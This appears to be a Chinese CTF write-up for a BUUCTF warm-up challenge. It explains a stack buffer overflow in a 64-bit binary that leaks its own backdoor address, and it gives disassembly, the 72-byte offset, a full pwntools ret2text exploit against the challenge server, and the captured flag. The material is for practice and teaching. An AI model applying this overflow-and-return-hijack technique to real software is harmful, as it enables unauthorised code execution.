---
title: rip 自带地址泄露的 ret2text
date: 2026-05-09 20:28:00
categories:
  - pwn
tags:
  - 栈溢出
  - ret2text
  - 地址泄露
  - 动态解析
  - 64位
---

> BUUCTF Warm Up | 程序主动泄露后门地址，练习动态接收解析技巧

## 0x01 题目环境

| 项目 | 内容 |
|------|------|
| 平台 | BUUCTF |
| 架构 | 64位 Linux ELF |
| 核心考点 | 栈溢出、地址泄露解析、ret2text |

## 0x02 逆向分析

### 漏洞一：主动地址泄露

程序在开头打印后门函数地址：

```asm
mov     esi, offset format      ; "%p\n"
mov     edx, offset sub_40060D  ; 后门函数地址
call    _sprintf
call    _write                  ; 输出 "WOW:0x40060d"
```

`sub_40060D` 是包含 `system("cat flag.txt")` 的后门函数。

### 漏洞二：栈缓冲区溢出

```asm
var_40= byte ptr -40h           ; 距离 rbp 偏移 -0x40 (64字节)
lea     rax, [rbp+var_40]
call    _gets                   ; 无边界检查
```

**偏移量**：`0x40` (64) + `8` (saved rbp) = **72 字节**

## 0x03 动态地址解析技巧

虽然可以硬编码 `0x40060D`，但在开启 PIE 的题目中地址每次运行都变。学会动态解析是必备技能：

```python
io.recvuntil(b"WOW:")
leak_str = io.recvline().strip()     # 接收 "0x40060d"
backdoor_addr = int(leak_str, 16)    # 十六进制字符串转 int
```

## 0x04 Exploit 代码

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
io = remote('node5.buuoj.cn', 26271)

# 1. 动态解析后门地址
io.recvuntil(b"WOW:")
leak_str = io.recvline().strip()
backdoor_addr = int(leak_str, 16)
log.success(f"Parsed Backdoor Address: {hex(backdoor_addr)}")

# 2. 构造 Payload
offset = 64 + 8
payload = b'A' * offset + p64(backdoor_addr)

# 3. 发送 Payload
io.recvuntil(b">")
io.sendline(payload)

# 4. 获取 Flag
io.interactive()
```

## 0x05 执行结果分析

```
Flag: flag{b61c9b34-d35c-4480-8827-3487229143e5}
```

**为什么拿完 Flag 会崩溃？**

后门函数只执行 `system("cat flag.txt")` 而非交互式 Shell。执行完毕后函数试图 `return`，但栈已被破坏，跳到无效地址引发 Segfault。这是正常现象。

## 0x06 核心考点

- **动态地址解析**：`int(leak_str, 16)` 将十六进制字符串转为地址
- **ret2text**：劫持到程序自带的后门代码
- **后门函数类型**：执行命令型 vs 交互式 Shell 型
- **栈破坏后的崩溃**：理解为什么非交互式后门执行完会 Segfault
